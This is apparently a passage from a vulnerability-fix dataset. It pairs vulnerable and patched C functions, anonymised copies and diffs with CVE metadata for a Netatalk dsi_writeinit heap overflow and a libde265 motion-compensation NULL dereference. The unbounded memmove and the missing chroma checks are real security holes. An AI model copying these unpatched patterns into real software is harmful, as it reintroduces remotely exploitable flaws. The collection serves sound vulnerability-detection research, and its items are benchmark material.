VAR_0->datasize = ntohl(VAR_0->header.dsi_len) - VAR_0->header.dsi_data.dsi_doff;
if (VAR_0->eof > VAR_0->start) {
VAR_3 = MIN(VAR_0->eof - VAR_0->start, VAR_0->datasize);
memmove(VAR_1, VAR_0->start, VAR_3);
VAR_0->start += VAR_3;
VAR_0->datasize -= VAR_3;
if (VAR_0->start >= VAR_0->eof)
VAR_0->start = VAR_0->eof = VAR_0->buffer;
}
LOG(VAR_4, VAR_5, ""dsi_writeinit: remaining DSI datasize: %jd"", (intmax_t)VAR_0->datasize);
return VAR_3;
}",,"size_t dsi_writeinit(DSI *dsi, void *buf, const size_t buflen)
{
    size_t bytes = 0;
    dsi->datasize = ntohl(dsi->header.dsi_len) - dsi->header.dsi_data.dsi_doff;

    if (dsi->eof > dsi->start) {
        /* We have data in the buffer */
        bytes = MIN(dsi->eof - dsi->start, dsi->datasize);
        memmove(buf, dsi->start, MIN(buflen, bytes));
        dsi->start += bytes;
        dsi->datasize -= bytes;
        if (dsi->start >= dsi->eof)
            dsi->start = dsi->eof = dsi->buffer;
    }

    LOG(log_maxdebug, logtype_dsi, ""dsi_writeinit: remaining DSI datasize: %jd"", (intmax_t)dsi->datasize);

    return bytes;
}","size_t dsi_writeinit(DSI *VAR_0, void *VAR_1, const size_t VAR_2)
{
    size_t VAR_3 = 0;
    VAR_0->datasize = ntohl(VAR_0->header.dsi_len) - VAR_0->header.dsi_data.dsi_doff;

    if (VAR_0->eof > VAR_0->start) {
        /* COMMENT_0 */
        VAR_3 = MIN(VAR_0->eof - VAR_0->start, VAR_0->datasize);
        memmove(VAR_1, VAR_0->start, MIN(VAR_2, VAR_3));
        VAR_0->start += VAR_3;
        VAR_0->datasize -= VAR_3;
        if (VAR_0->start >= VAR_0->eof)
            VAR_0->start = VAR_0->eof = VAR_0->buffer;
    }

    LOG(VAR_4, VAR_5, ""dsi_writeinit: remaining DSI datasize: %jd"", (intmax_t)VAR_0->datasize);

    return VAR_3;
}",,"--- func_before
+++ func_after
@@ -1,4 +1,4 @@
-size_t dsi_writeinit(DSI *dsi, void *buf, const size_t buflen _U_)
+size_t dsi_writeinit(DSI *dsi, void *buf, const size_t buflen)
 {
     size_t bytes = 0;
     dsi->datasize = ntohl(dsi->header.dsi_len) - dsi->header.dsi_data.dsi_doff;
@@ -6,7 +6,7 @@
     if (dsi->eof > dsi->start) {
         /* We have data in the buffer */
         bytes = MIN(dsi->eof - dsi->start, dsi->datasize);
-        memmove(buf, dsi->start, bytes);
+        memmove(buf, dsi->start, MIN(buflen, bytes));
         dsi->start += bytes;
         dsi->datasize -= bytes;
         if (dsi->start >= dsi->eof)","{'deleted_lines': ['size_t dsi_writeinit(DSI *dsi, void *buf, const size_t buflen _U_)', '        memmove(buf, dsi->start, bytes);'], 'added_lines': ['size_t dsi_writeinit(DSI *dsi, void *buf, const size_t buflen)', '        memmove(buf, dsi->start, MIN(buflen, bytes));']}",True,This vulnerability allows remote attackers to execute arbitrary code on affected installations of Netatalk. Authentication is not required to exploit this vulnerability. The specific flaw exists within the dsi_writeinit function. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-17646.,9.8,CRITICAL,3,valid,2023-01-20T10:32:46Z,4
CVE-2023-24756,['CWE-476'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,strukturag/libde265,fix for monochrome MC (fixes #380),48eb7dafe204b825b4a62948ed171a0cd3f1bda2,https://github.com/strukturag/libde265/commit/48eb7dafe204b825b4a62948ed171a0cd3f1bda2,libde265/motion.cc,generate_inter_prediction_samples,"void generate_inter_prediction_samples(base_context* ctx,
const slice_segment_header* shdr,
de265_image* img,
int xC,int yC,
int xB,int yB,
int nCS, int nPbW,int nPbH,
const PBMotion* vi)
{
int xP = xC+xB;
int yP = yC+yB;
void*  pixels[3];
int    stride[3];
const pic_parameter_set* pps = shdr->pps.get();
const seq_parameter_set* sps = pps->sps.get();
if (sps->BitDepth_Y != img->get_bit_depth(0) ||
sps->BitDepth_C != img->get_bit_depth(1)) {
img->integrity = INTEGRITY_DECODING_ERRORS;
ctx->add_warning(DE265_WARNING_BIT_DEPTH_OF_CURRENT_IMAGE_DOES_NOT_MATCH_SPS, false);
return;
}
if (sps->chroma_format_idc != img->get_chroma_format()) {
img->integrity = INTEGRITY_DECODING_ERRORS;
ctx->add_warning(DE265_WARNING_CHROMA_OF_CURRENT_IMAGE_DOES_NOT_MATCH_SPS, false);
return;
}
const int SubWidthC  = sps->SubWidthC;
const int SubHeightC = sps->SubHeightC;
pixels[0] = img->get_image_plane_at_pos_any_depth(0,xP,yP);
stride[0] = img->get_image_stride(0);
pixels[1] = img->get_image_plane_at_pos_any_depth(1,xP/SubWidthC,yP/SubHeightC);
stride[1] = img->get_image_stride(1);
pixels[2] = img->get_image_plane_at_pos_any_depth(2,xP/SubWidthC,yP/SubHeightC);
stride[2] = img->get_image_stride(2);
ALIGNED_16(int16_t) predSamplesL                 [2 ][MAX_CU_SIZE* MAX_CU_SIZE];
ALIGNED_16(int16_t) predSamplesC[2  ][2 ][MAX_CU_SIZE* MAX_CU_SIZE];
int predFlag[2];
predFlag[0] = vi->predFlag[0];
predFlag[1] = vi->predFlag[1];
const int bit_depth_L = sps->BitDepth_Y;
const int bit_depth_C = sps->BitDepth_C;
if (pps->weighted_pred_flag==0) {
if (predFlag[0] && predFlag[1]) {
if (vi->mv[0].x == vi->mv[1].x &&
vi->mv[0].y == vi->mv[1].y &&
shdr->RefPicList[0][vi->refIdx[0]] ==
shdr->RefPicList[1][vi->refIdx[1]]) {
predFlag[1] = 0;
}
}
}
for (int l=0;l<2;l++) {
if (predFlag[l]) {
if (vi->refIdx[l] >= MAX_NUM_REF_PICS) {
img->integrity = INTEGRITY_DECODING_ERRORS;
ctx->add_warning(DE265_WARNING_NONEXISTING_REFERENCE_PICTURE_ACCESSED, false);
return;
}
const de265_image* refPic = ctx->get_image(shdr->RefPicList[l][vi->refIdx[l]]);
logtrace(LogMotion, ""refIdx: %d -> dpb[%d]\n"", vi->refIdx[l], shdr->RefPicList[l][vi->refIdx[l]]);
if (!refPic || refPic->PicState == UnusedForReference) {
img->integrity = INTEGRITY_DECODING_ERRORS;
ctx->add_warning(DE265_WARNING_NONEXISTING_REFERENCE_PICTURE_ACCESSED, false);
}
else if (refPic->get_width(0) != sps->pic_width_in_luma_samples ||
refPic->get_height(0) != sps->pic_height_in_luma_samples ||
img->get_chroma_format() != refPic->get_chroma_format()) {
img->integrity = INTEGRITY_DECODING_ERRORS;
ctx->add_warning(DE265_WARNING_REFERENCE_IMAGE_SIZE_DOES_NOT_MATCH_SPS, false);
}
else if (img->get_bit_depth(0) != refPic->get_bit_depth(0) ||
img->get_bit_depth(1) != refPic->get_bit_depth(1)) {
img->integrity = INTEGRITY_DECODING_ERRORS;
ctx->add_warning(DE265_WARNING_REFERENCE_IMAGE_BIT_DEPTH_DOES_NOT_MATCH, false);
}
else if (img->get_chroma_format() != refPic->get_chroma_format()) {
img->integrity = INTEGRITY_DECODING_ERRORS;
ctx->add_warning(DE265_WARNING_REFERENCE_IMAGE_CHROMA_FORMAT_DOES_NOT_MATCH, false);
}
else {
logtrace(LogMotion,""do MC: L%d,MV=%d;%d RefPOC=%d\n"",
l,vi->mv[l].x,vi->mv[l].y,refPic->PicOrderCntVal);
if (img->high_bit_depth(0)) {
mc_luma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP,yP,
predSamplesL[l],nCS,
(const uint16_t*)refPic->get_image_plane(0),
refPic->get_luma_stride(), nPbW,nPbH, bit_depth_L);
}
else {
mc_luma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP,yP,
predSamplesL[l],nCS,
(const uint8_t*)refPic->get_image_plane(0),
refPic->get_luma_stride(), nPbW,nPbH, bit_depth_L);
}
if (img->get_chroma_format() != de265_chroma_mono) {
if (img->high_bit_depth(1)) {
mc_chroma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP, yP,
predSamplesC[0][l], nCS, (const uint16_t*) refPic->get_image_plane(1),
refPic->get_chroma_stride(), nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
mc_chroma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP, yP,
predSamplesC[1][l], nCS, (const uint16_t*) refPic->get_image_plane(2),
refPic->get_chroma_stride(), nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
}
else {
mc_chroma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP, yP,
predSamplesC[0][l], nCS, (const uint8_t*) refPic->get_image_plane(1),
refPic->get_chroma_stride(), nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
mc_chroma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP, yP,
predSamplesC[1][l], nCS, (const uint8_t*) refPic->get_image_plane(2),
refPic->get_chroma_stride(), nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
}
}
}
}
}
const int shift1_L = libde265_max(2,14-sps->BitDepth_Y);
const int offset_shift1_L = img->get_sps().WpOffsetBdShiftY;
const int shift1_C = libde265_max(2,14-sps->BitDepth_C);
const int offset_shift1_C = img->get_sps().WpOffsetBdShiftC;
logtrace(LogMotion,""predFlags (modified): %d %d\n"", predFlag[0], predFlag[1]);
if (shdr->slice_type == SLICE_TYPE_P) {
if (pps->weighted_pred_flag==0) {
if (predFlag[0]==1 && predFlag[1]==0) {
ctx->acceleration.put_unweighted_pred(pixels[0], stride[0],
predSamplesL[0],nCS, nPbW,nPbH, bit_depth_L);
if (img->get_chroma_format() != de265_chroma_mono) {
ctx->acceleration.put_unweighted_pred(pixels[1], stride[1],
predSamplesC[0][0], nCS,
nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
ctx->acceleration.put_unweighted_pred(pixels[2], stride[2],
predSamplesC[1][0], nCS,
nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
}
}
else {
ctx->add_warning(DE265_WARNING_BOTH_PREDFLAGS_ZERO, false);
img->integrity = INTEGRITY_DECODING_ERRORS;
}
}
else {
if (predFlag[0]==1 && predFlag[1]==0) {
int refIdx0 = vi->refIdx[0];
int luma_log2WD   = shdr->luma_log2_weight_denom + shift1_L;
int chroma_log2WD = shdr->ChromaLog2WeightDenom  + shift1_C;
int luma_w0 = shdr->LumaWeight[0][refIdx0];
int luma_o0 = shdr->luma_offset[0][refIdx0] * (1<<(offset_shift1_L));
int chroma0_w0 = shdr->ChromaWeight[0][refIdx0][0];
int chroma0_o0 = shdr->ChromaOffset[0][refIdx0][0] * (1<<(offset_shift1_C));
int chroma1_w0 = shdr->ChromaWeight[0][refIdx0][1];
int chroma1_o0 = shdr->ChromaOffset[0][refIdx0][1] * (1<<(offset_shift1_C));
logtrace(LogMotion,""weighted-0 [%d] %d %d %d  %dx%d\n"", refIdx0, luma_log2WD-6,luma_w0,luma_o0,nPbW,nPbH);
ctx->acceleration.put_weighted_pred(pixels[0], stride[0],
predSamplesL[0],nCS, nPbW,nPbH,
luma_w0, luma_o0, luma_log2WD, bit_depth_L);
ctx->acceleration.put_weighted_pred(pixels[1], stride[1],
predSamplesC[0][0],nCS, nPbW/SubWidthC,nPbH/SubHeightC,
chroma0_w0, chroma0_o0, chroma_log2WD, bit_depth_C);
ctx->acceleration.put_weighted_pred(pixels[2], stride[2],
predSamplesC[1][0],nCS, nPbW/SubWidthC,nPbH/SubHeightC,
chroma1_w0, chroma1_o0, chroma_log2WD, bit_depth_C);
}
else {
ctx->add_warning(DE265_WARNING_BOTH_PREDFLAGS_ZERO, false);
img->integrity = INTEGRITY_DECODING_ERRORS;
}
}
}
else {
assert(shdr->slice_type == SLICE_TYPE_B);
if (predFlag[0]==1 && predFlag[1]==1) {
if (pps->weighted_bipred_flag==0) {
int16_t* in0 = predSamplesL[0];
int16_t* in1 = predSamplesL[1];
ctx->acceleration.put_weighted_pred_avg(pixels[0], stride[0],
in0,in1, nCS, nPbW, nPbH, bit_depth_L);
int16_t* in00 = predSamplesC[0][0];
int16_t* in01 = predSamplesC[0][1];
int16_t* in10 = predSamplesC[1][0];
int16_t* in11 = predSamplesC[1][1];
ctx->acceleration.put_weighted_pred_avg(pixels[1], stride[1],
in00,in01, nCS,
nPbW/SubWidthC, nPbH/SubHeightC, bit_depth_C);
ctx->acceleration.put_weighted_pred_avg(pixels[2], stride[2],
in10,in11, nCS,
nPbW/SubWidthC, nPbH/SubHeightC, bit_depth_C);
}
else {
int refIdx0 = vi->refIdx[0];
int refIdx1 = vi->refIdx[1];
int luma_log2WD   = shdr->luma_log2_weight_denom + shift1_L;
int chroma_log2WD = shdr->ChromaLog2WeightDenom + shift1_C;
int luma_w0 = shdr->LumaWeight[0][refIdx0];
int luma_o0 = shdr->luma_offset[0][refIdx0] * (1<<(offset_shift1_L));
int luma_w1 = shdr->LumaWeight[1][refIdx1];
int luma_o1 = shdr->luma_offset[1][refIdx1] * (1<<(offset_shift1_L));
int chroma0_w0 = shdr->ChromaWeight[0][refIdx0][0];
int chroma0_o0 = shdr->ChromaOffset[0][refIdx0][0] * (1<<(offset_shift1_C));
int chroma1_w0 = shdr->ChromaWeight[0][refIdx0][1];
int chroma1_o0 = shdr->ChromaOffset[0][refIdx0][1] * (1<<(offset_shift1_C));
int chroma0_w1 = shdr->ChromaWeight[1][refIdx1][0];
int chroma0_o1 = shdr->ChromaOffset[1][refIdx1][0] * (1<<(offset_shift1_C));
int chroma1_w1 = shdr->ChromaWeight[1][refIdx1][1];
int chroma1_o1 = shdr->ChromaOffset[1][refIdx1][1] * (1<<(offset_shift1_C));
logtrace(LogMotion,""weighted-BI-0 [%d] %d %d %d  %dx%d\n"", refIdx0, luma_log2WD-6,luma_w0,luma_o0,nPbW,nPbH);
logtrace(LogMotion,""weighted-BI-1 [%d] %d %d %d  %dx%d\n"", refIdx1, luma_log2WD-6,luma_w1,luma_o1,nPbW,nPbH);
int16_t* in0 = predSamplesL[0];
int16_t* in1 = predSamplesL[1];
ctx->acceleration.put_weighted_bipred(pixels[0], stride[0],
in0,in1, nCS, nPbW, nPbH,
luma_w0,luma_o0,
luma_w1,luma_o1,
luma_log2WD, bit_depth_L);
int16_t* in00 = predSamplesC[0][0];
int16_t* in01 = predSamplesC[0][1];
int16_t* in10 = predSamplesC[1][0];
int16_t* in11 = predSamplesC[1][1];
if (img->get_chroma_format() != de265_chroma_mono) {
ctx->acceleration.put_weighted_bipred(pixels[1], stride[1],
in00, in01, nCS, nPbW / SubWidthC, nPbH / SubHeightC,
chroma0_w0, chroma0_o0,
chroma0_w1, chroma0_o1,
chroma_log2WD, bit_depth_C);
ctx->acceleration.put_weighted_bipred(pixels[2], stride[2],
in10, in11, nCS, nPbW / SubWidthC, nPbH / SubHeightC,
chroma1_w0, chroma1_o0,
chroma1_w1, chroma1_o1,
chroma_log2WD, bit_depth_C);
}
}
}
else if (predFlag[0]==1 || predFlag[1]==1) {
int l = predFlag[0] ? 0 : 1;
if (pps->weighted_bipred_flag==0) {
ctx->acceleration.put_unweighted_pred(pixels[0], stride[0],
predSamplesL[l],nCS, nPbW,nPbH, bit_depth_L);
ctx->acceleration.put_unweighted_pred(pixels[1], stride[1],
predSamplesC[0][l],nCS,
nPbW/SubWidthC,nPbH/SubHeightC, bit_depth_C);
ctx->acceleration.put_unweighted_pred(pixels[2], stride[2],
predSamplesC[1][l],nCS,
nPbW/SubWidthC,nPbH/SubHeightC, bit_depth_C);
}
else {
int refIdx = vi->refIdx[l];
int luma_log2WD   = shdr->luma_log2_weight_denom + shift1_L;
int chroma_log2WD = shdr->ChromaLog2WeightDenom  + shift1_C;
int luma_w = shdr->LumaWeight[l][refIdx];
int luma_o = shdr->luma_offset[l][refIdx] * (1<<(offset_shift1_L));
int chroma0_w = shdr->ChromaWeight[l][refIdx][0];
int chroma0_o = shdr->ChromaOffset[l][refIdx][0] * (1<<(offset_shift1_C));
int chroma1_w = shdr->ChromaWeight[l][refIdx][1];
int chroma1_o = shdr->ChromaOffset[l][refIdx][1] * (1<<(offset_shift1_C));
logtrace(LogMotion,""weighted-B-L%d [%d] %d %d %d  %dx%d\n"", l, refIdx, luma_log2WD-6,luma_w,luma_o,nPbW,nPbH);
ctx->acceleration.put_weighted_pred(pixels[0], stride[0],
predSamplesL[l],nCS, nPbW,nPbH,
luma_w, luma_o, luma_log2WD, bit_depth_L);
if (img->get_chroma_format() != de265_chroma_mono) {
ctx->acceleration.put_weighted_pred(pixels[1], stride[1],
predSamplesC[0][l], nCS,
nPbW / SubWidthC, nPbH / SubHeightC,
chroma0_w, chroma0_o, chroma_log2WD, bit_depth_C);
ctx->acceleration.put_weighted_pred(pixels[2], stride[2],
predSamplesC[1][l], nCS,
nPbW / SubWidthC, nPbH / SubHeightC,
chroma1_w, chroma1_o, chroma_log2WD, bit_depth_C);
}
}
}
else {
ctx->add_warning(DE265_WARNING_BOTH_PREDFLAGS_ZERO, false);
img->integrity = INTEGRITY_DECODING_ERRORS;
}
}
#if defined(DE265_LOG_TRACE) && 0
logtrace(LogTransform,""MC pixels (luma), position %d %d:\n"", xP,yP);
for (int y=0;y<nPbH;y++) {
logtrace(LogTransform,""MC-y-%d-%d "",xP,yP+y);
for (int x=0;x<nPbW;x++) {
logtrace(LogTransform,""*%02x "", pixels[0][x+y*stride[0]]);
}
logtrace(LogTransform,""*\n"");
}
logtrace(LogTransform,""MC pixels (chroma cb), position %d %d:\n"", xP/2,yP/2);
for (int y=0;y<nPbH/2;y++) {
logtrace(LogTransform,""MC-cb-%d-%d "",xP/2,yP/2+y);
for (int x=0;x<nPbW/2;x++) {
logtrace(LogTransform,""*%02x "", pixels[1][x+y*stride[1]]);
}
logtrace(LogTransform,""*\n"");
}
logtrace(LogTransform,""MC pixels (chroma cr), position %d %d:\n"", xP/2,yP/2);
for (int y=0;y<nPbH/2;y++) {
logtrace(LogTransform,""MC-cr-%d-%d "",xP/2,yP/2+y);
for (int x=0;x<nPbW/2;x++) {
logtrace(LogTransform,""*%02x "", pixels[2][x+y*stride[2]]);
}
logtrace(LogTransform,""*\n"");
}
#endif
}","void generate_inter_prediction_samples(base_context* VAR_0,
const slice_segment_header* VAR_1,
de265_image* VAR_2,
int VAR_3,int VAR_4,
int VAR_5,int VAR_6,
int VAR_7, int VAR_8,int VAR_9,
const PBMotion* VAR_10)
{
int VAR_11 = VAR_3+VAR_5;
int VAR_12 = VAR_4+VAR_6;
void*  VAR_13[3];
int    VAR_14[3];
const pic_parameter_set* VAR_15 = VAR_1->pps.get();
const seq_parameter_set* VAR_16 = VAR_15->sps.get();
if (VAR_16->BitDepth_Y != VAR_2->get_bit_depth(0) ||
VAR_16->BitDepth_C != VAR_2->get_bit_depth(1)) {
VAR_2->integrity = VAR_17;
VAR_0->add_warning(VAR_18, false);
return;
}
if (VAR_16->chroma_format_idc != VAR_2->get_chroma_format()) {
VAR_2->integrity = VAR_17;
VAR_0->add_warning(VAR_19, false);
return;
}
const int VAR_20  = VAR_16->SubWidthC;
const int VAR_21 = VAR_16->SubHeightC;
VAR_13[0] = VAR_2->get_image_plane_at_pos_any_depth(0,VAR_11,VAR_12);
VAR_14[0] = VAR_2->get_image_stride(0);
VAR_13[1] = VAR_2->get_image_plane_at_pos_any_depth(1,VAR_11/VAR_20,VAR_12/VAR_21);
VAR_14[1] = VAR_2->get_image_stride(1);
VAR_13[2] = VAR_2->get_image_plane_at_pos_any_depth(2,VAR_11/VAR_20,VAR_12/VAR_21);
VAR_14[2] = VAR_2->get_image_stride(2);
ALIGNED_16(int16_t) VAR_22                 [2 ][VAR_23* VAR_23];
ALIGNED_16(int16_t) VAR_24[2  ][2 ][VAR_23* VAR_23];
int VAR_25[2];
VAR_25[0] = VAR_10->predFlag[0];
VAR_25[1] = VAR_10->predFlag[1];
const int VAR_26 = VAR_16->BitDepth_Y;
const int VAR_27 = VAR_16->BitDepth_C;
if (VAR_15->weighted_pred_flag==0) {
if (VAR_25[0] && VAR_25[1]) {
if (VAR_10->mv[0].x == VAR_10->mv[1].x &&
VAR_10->mv[0].y == VAR_10->mv[1].y &&
VAR_1->RefPicList[0][VAR_10->refIdx[0]] ==
VAR_1->RefPicList[1][VAR_10->refIdx[1]]) {
VAR_25[1] = 0;
}
}
}
for (int VAR_28=0;VAR_28<2;VAR_28++) {
if (VAR_25[VAR_28]) {
if (VAR_10->refIdx[VAR_28] >= VAR_29) {
VAR_2->integrity = VAR_17;
VAR_0->add_warning(VAR_30, false);
return;
}
const de265_image* VAR_31 = VAR_0->get_image(VAR_1->RefPicList[VAR_28][VAR_10->refIdx[VAR_28]]);
logtrace(VAR_32, ""refIdx: %d -> dpb[%d]\n"", VAR_10->refIdx[VAR_28], VAR_1->RefPicList[VAR_28][VAR_10->refIdx[VAR_28]]);
if (!VAR_31 || VAR_31->PicState == VAR_33) {
VAR_2->integrity = VAR_17;
VAR_0->add_warning(VAR_30, false);
}
else if (VAR_31->get_width(0) != VAR_16->pic_width_in_luma_samples ||
VAR_31->get_height(0) != VAR_16->pic_height_in_luma_samples ||
VAR_2->get_chroma_format() != VAR_31->get_chroma_format()) {
VAR_2->integrity = VAR_17;
VAR_0->add_warning(VAR_34, false);
}
else if (VAR_2->get_bit_depth(0) != VAR_31->get_bit_depth(0) ||
VAR_2->get_bit_depth(1) != VAR_31->get_bit_depth(1)) {
VAR_2->integrity = VAR_17;
VAR_0->add_warning(VAR_35, false);
}
else if (VAR_2->get_chroma_format() != VAR_31->get_chroma_format()) {
VAR_2->integrity = VAR_17;
VAR_0->add_warning(VAR_36, false);
}
else {
logtrace(VAR_32,""do MC: L%d,MV=%d;%d RefPOC=%d\n"",
VAR_28,VAR_10->mv[VAR_28].x,VAR_10->mv[VAR_28].y,VAR_31->PicOrderCntVal);
if (VAR_2->high_bit_depth(0)) {
mc_luma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11,VAR_12,
VAR_22[VAR_28],VAR_7,
(const uint16_t*)VAR_31->get_image_plane(0),
VAR_31->get_luma_stride(), VAR_8,VAR_9, VAR_26);
}
else {
mc_luma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11,VAR_12,
VAR_22[VAR_28],VAR_7,
(const uint8_t*)VAR_31->get_image_plane(0),
VAR_31->get_luma_stride(), VAR_8,VAR_9, VAR_26);
}
if (VAR_2->get_chroma_format() != VAR_37) {
if (VAR_2->high_bit_depth(1)) {
mc_chroma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11, VAR_12,
VAR_24[0][VAR_28], VAR_7, (const uint16_t*) VAR_31->get_image_plane(1),
VAR_31->get_chroma_stride(), VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
mc_chroma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11, VAR_12,
VAR_24[1][VAR_28], VAR_7, (const uint16_t*) VAR_31->get_image_plane(2),
VAR_31->get_chroma_stride(), VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
}
else {
mc_chroma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11, VAR_12,
VAR_24[0][VAR_28], VAR_7, (const uint8_t*) VAR_31->get_image_plane(1),
VAR_31->get_chroma_stride(), VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
mc_chroma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11, VAR_12,
VAR_24[1][VAR_28], VAR_7, (const uint8_t*) VAR_31->get_image_plane(2),
VAR_31->get_chroma_stride(), VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
}
}
}
}
}
const int VAR_38 = libde265_max(2,14-VAR_16->BitDepth_Y);
const int VAR_39 = VAR_2->get_sps().WpOffsetBdShiftY;
const int VAR_40 = libde265_max(2,14-VAR_16->BitDepth_C);
const int VAR_41 = VAR_2->get_sps().WpOffsetBdShiftC;
logtrace(VAR_32,""predFlags (modified): %d %d\n"", VAR_25[0], VAR_25[1]);
if (VAR_1->slice_type == VAR_42) {
if (VAR_15->weighted_pred_flag==0) {
if (VAR_25[0]==1 && VAR_25[1]==0) {
VAR_0->acceleration.put_unweighted_pred(VAR_13[0], VAR_14[0],
VAR_22[0],VAR_7, VAR_8,VAR_9, VAR_26);
if (VAR_2->get_chroma_format() != VAR_37) {
VAR_0->acceleration.put_unweighted_pred(VAR_13[1], VAR_14[1],
VAR_24[0][0], VAR_7,
VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
VAR_0->acceleration.put_unweighted_pred(VAR_13[2], VAR_14[2],
VAR_24[1][0], VAR_7,
VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
}
}
else {
VAR_0->add_warning(VAR_43, false);
VAR_2->integrity = VAR_17;
}
}
else {
if (VAR_25[0]==1 && VAR_25[1]==0) {
int VAR_44 = VAR_10->refIdx[0];
int VAR_45   = VAR_1->luma_log2_weight_denom + VAR_38;
int VAR_46 = VAR_1->ChromaLog2WeightDenom  + VAR_40;
int VAR_47 = VAR_1->LumaWeight[0][VAR_44];
int VAR_48 = VAR_1->luma_offset[0][VAR_44] * (1<<(VAR_39));
int VAR_49 = VAR_1->ChromaWeight[0][VAR_44][0];
int VAR_50 = VAR_1->ChromaOffset[0][VAR_44][0] * (1<<(VAR_41));
int VAR_51 = VAR_1->ChromaWeight[0][VAR_44][1];
int VAR_52 = VAR_1->ChromaOffset[0][VAR_44][1] * (1<<(VAR_41));
logtrace(VAR_32,""weighted-0 [%d] %d %d %d  %dx%d\n"", VAR_44, VAR_45-6,VAR_47,VAR_48,VAR_8,VAR_9);
VAR_0->acceleration.put_weighted_pred(VAR_13[0], VAR_14[0],
VAR_22[0],VAR_7, VAR_8,VAR_9,
VAR_47, VAR_48, VAR_45, VAR_26);
VAR_0->acceleration.put_weighted_pred(VAR_13[1], VAR_14[1],
VAR_24[0][0],VAR_7, VAR_8/VAR_20,VAR_9/VAR_21,
VAR_49, VAR_50, VAR_46, VAR_27);
VAR_0->acceleration.put_weighted_pred(VAR_13[2], VAR_14[2],
VAR_24[1][0],VAR_7, VAR_8/VAR_20,VAR_9/VAR_21,
VAR_51, VAR_52, VAR_46, VAR_27);
}
else {
VAR_0->add_warning(VAR_43, false);
VAR_2->integrity = VAR_17;
}
}
}
else {
assert(VAR_1->slice_type == VAR_53);
if (VAR_25[0]==1 && VAR_25[1]==1) {
if (VAR_15->weighted_bipred_flag==0) {
int16_t* VAR_54 = VAR_22[0];
int16_t* VAR_55 = VAR_22[1];
VAR_0->acceleration.put_weighted_pred_avg(VAR_13[0], VAR_14[0],
VAR_54,VAR_55, VAR_7, VAR_8, VAR_9, VAR_26);
int16_t* VAR_56 = VAR_24[0][0];
int16_t* VAR_57 = VAR_24[0][1];
int16_t* VAR_58 = VAR_24[1][0];
int16_t* VAR_59 = VAR_24[1][1];
VAR_0->acceleration.put_weighted_pred_avg(VAR_13[1], VAR_14[1],
VAR_56,VAR_57, VAR_7,
VAR_8/VAR_20, VAR_9/VAR_21, VAR_27);
VAR_0->acceleration.put_weighted_pred_avg(VAR_13[2], VAR_14[2],
VAR_58,VAR_59, VAR_7,
VAR_8/VAR_20, VAR_9/VAR_21, VAR_27);
}
else {
int VAR_44 = VAR_10->refIdx[0];
int VAR_60 = VAR_10->refIdx[1];
int VAR_45   = VAR_1->luma_log2_weight_denom + VAR_38;
int VAR_46 = VAR_1->ChromaLog2WeightDenom + VAR_40;
int VAR_47 = VAR_1->LumaWeight[0][VAR_44];
int VAR_48 = VAR_1->luma_offset[0][VAR_44] * (1<<(VAR_39));
int VAR_61 = VAR_1->LumaWeight[1][VAR_60];
int VAR_62 = VAR_1->luma_offset[1][VAR_60] * (1<<(VAR_39));
int VAR_49 = VAR_1->ChromaWeight[0][VAR_44][0];
int VAR_50 = VAR_1->ChromaOffset[0][VAR_44][0] * (1<<(VAR_41));
int VAR_51 = VAR_1->ChromaWeight[0][VAR_44][1];
int VAR_52 = VAR_1->ChromaOffset[0][VAR_44][1] * (1<<(VAR_41));
int VAR_63 = VAR_1->ChromaWeight[1][VAR_60][0];
int VAR_64 = VAR_1->ChromaOffset[1][VAR_60][0] * (1<<(VAR_41));
int VAR_65 = VAR_1->ChromaWeight[1][VAR_60][1];
int VAR_66 = VAR_1->ChromaOffset[1][VAR_60][1] * (1<<(VAR_41));
logtrace(VAR_32,""weighted-BI-0 [%d] %d %d %d  %dx%d\n"", VAR_44, VAR_45-6,VAR_47,VAR_48,VAR_8,VAR_9);
logtrace(VAR_32,""weighted-BI-1 [%d] %d %d %d  %dx%d\n"", VAR_60, VAR_45-6,VAR_61,VAR_62,VAR_8,VAR_9);
int16_t* VAR_54 = VAR_22[0];
int16_t* VAR_55 = VAR_22[1];
VAR_0->acceleration.put_weighted_bipred(VAR_13[0], VAR_14[0],
VAR_54,VAR_55, VAR_7, VAR_8, VAR_9,
VAR_47,VAR_48,
VAR_61,VAR_62,
VAR_45, VAR_26);
int16_t* VAR_56 = VAR_24[0][0];
int16_t* VAR_57 = VAR_24[0][1];
int16_t* VAR_58 = VAR_24[1][0];
int16_t* VAR_59 = VAR_24[1][1];
if (VAR_2->get_chroma_format() != VAR_37) {
VAR_0->acceleration.put_weighted_bipred(VAR_13[1], VAR_14[1],
VAR_56, VAR_57, VAR_7, VAR_8 / VAR_20, VAR_9 / VAR_21,
VAR_49, VAR_50,
VAR_63, VAR_64,
VAR_46, VAR_27);
VAR_0->acceleration.put_weighted_bipred(VAR_13[2], VAR_14[2],
